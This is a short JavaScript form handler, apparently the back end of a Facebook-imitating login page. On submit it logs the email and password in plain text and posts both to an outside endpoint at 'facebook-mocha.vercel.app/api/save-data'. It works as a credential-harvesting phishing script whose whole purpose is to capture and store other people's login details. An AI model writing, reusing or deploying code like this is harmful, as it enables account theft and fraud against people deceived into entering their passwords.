const form = document.getElementById('formulario')


form.addEventListener('submit', async (e) => {
	e.preventDefault()

	const email = document.getElementById('email')
	const password = document.getElementById('password')

	console.log(email.value, password.value)

	const url = 'https://facebook-mocha.vercel.app/api/save-data'

	const data = {
		email: email.value,
		password: password.value
	}

	const response = await axios.post(url, data)

	console.log(response)


})